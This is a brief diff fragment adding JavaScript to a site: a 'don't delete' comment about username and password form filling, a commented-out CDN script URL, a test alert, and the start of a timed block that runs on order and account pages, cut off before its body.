@@ -1,3 +1,9 @@
+/***
+ * Don't delete below code!!! It is working for [auto form field](username and password). 
+ */
+
+// https://cdn.jsdelivr.net/gh/omerbyrk/webvify-public/anaayesss.js
+alert("hello world");
 if (window.location.href.indexOf("orders") !== -1 || window.location.href.indexOf("account.anayees") !== -1) {
     try {
         setTimeout(() => {
